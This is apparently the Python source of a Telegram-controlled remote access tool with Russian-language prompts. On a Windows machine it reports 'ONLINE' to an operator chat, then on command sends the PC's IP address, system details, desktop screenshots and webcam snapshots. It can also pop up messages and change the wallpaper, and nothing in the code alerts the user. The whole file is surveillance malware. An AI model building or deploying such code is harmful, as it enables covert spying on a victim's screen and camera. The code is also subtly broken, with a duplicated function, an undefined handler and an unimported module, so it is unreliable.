import os
import ctypes
import time

import requests
import cv2
import pyautogui
import platform

import telebot
from telebot import types

import config

bot = telebot.TeleBot(config.TOKEN)
bot.send_message(config.CHAT_ID, "ONLINE")


@bot.message_handler(commands=["start", "help"])
def start(message):
	rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
	btns = [["IP Address🌎", "Specifications ⚙", "WebCam 📷"],
			["Message ✉", "Input 📩", "Wallpaper 🖼", "Screenshot 👀"]]

	rmk.row(*btns[0])
	rmk.row(*btns[1])
	bot.send_message(message.chat.id,
		"""Выберите действие:
		/ip - Получить IP адрес
		/spec - Получить информацию о системе
		/webcam - Получить снимок экрана
		/message - Отправить сообщение
		/input - Отправить сообщение с возможностью ответа
		/wallpaper - Сменить обои
		/sct - Получить снимок экрана
		""",
		reply_markup=rmk
	)


@bot.message_handler(content_types=["text"])
def commands_handler(message):
	if message.text == "IP Address🌎":
		ip_address(message)
	elif message.text == "Specifications ⚙":
		specifications(message)
	elif message.text == "WebCam 📷":
		webcam(message)
	elif message.text == "Message ✉":
		send_message_to_client(message)
	elif message.text == "Input 📩":
		send_message_with_answer(message)
	elif message.text == "Wallpaper 🖼":
		wallpaper(message)
	elif message.text == "Screenshot 👀":
		screenshot(message)


@bot.message_handler(commands=["ip", "ip_address"])
def ip_address(message):
	response = requests.get("http://jsonip.com/").json()
	bot.send_message(message.chat.id, f"IP Address: {response['ip']}")


@bot.message_handler(commands=["spec", "specifications"])
def specifications(message):
	banner = f"""
	Name PC: {platform.node()}
	Processor: {platform.processor()}
	System: {platform.system()} {platform.release()}
	"""
	bot.send_message(message.chat.id, banner)


@bot.message_handler(commands=["sct", "screenshot"])
def screenshot(message):
	filename = f"{time.time()}.jpg"
	pyautogui.screenshot(filename)

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)


@bot.message_handler(commands=["webcam"])
def webcam(message):
	filename = "cam.jpg"
	cap = cv2.VideoCapture(0)

	for i in range(30):
		cap.read()

	ret, frame = cap.read()

	cv2.imwrite(filename, frame)
	cap.release()

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)


@bot.message_handler(commands=["message"])
def send_message_to_client(message):
	msg = bot.send_message(message.chat.id, "Введите сообщение:")
	bot.register_next_step_handler(msg, sms_to_client)


def sms_to_client(message):
	try:
		pyautogui.alert(message.text, "Message")
	except Exception:
		bot.send_message(message.chat.id, "Что-то пошло не так...")


@bot.message_handler(commands=["input"])
def send_message_with_answer(message):
	msg = bot.send_message(message.chat.id, "Введите сообщение:")
	bot.register_next_step_handler(msg, sms_to_client_with_answer)


def send_message_with_answer(message):
	try:
		answer = pag.prompt(message.text, "~")
		bot.send_message(message.chat.id, answer)
	except Exception:
		bot.send_message(message.chat.id, "Что-то пошло не так...")


@bot.message_handler(commands=["wallpaper"])
def wallpaper(message):
	msg = bot.send_message(message.chat.id, "Отправьте картинку:")
	bot.register_next_step_handler(msg, set_wallpaper)


@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
	file = message.photo[-1].file_id
	file = bot.get_file(file)

	download_file = bot.download_file(file.file_path)
	with open("image.jpg", "wb") as img:
		img.write(download_file)

	path = os.path.abspath("image.jpg")
	ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


if __name__ == '__main__':
	bot.polling()